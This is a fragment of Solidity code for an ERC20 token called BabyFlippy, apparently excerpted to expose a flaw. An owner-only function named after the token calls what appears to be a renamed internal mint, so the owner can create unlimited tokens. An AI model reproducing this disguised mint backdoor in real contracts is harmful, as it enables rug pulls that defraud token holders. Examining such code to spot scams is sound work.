...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function BabyFlippy(uint256 amount) public onlyOwner {
    BabyFlippy(msg.sender, amount);
    }
    ...
    function BabyFlippy(address account, uint256 amount) internal virtual {
...
contract BabyFlippy is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("BabyFlippy", "BFLIP") {
        BabyFlippy(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}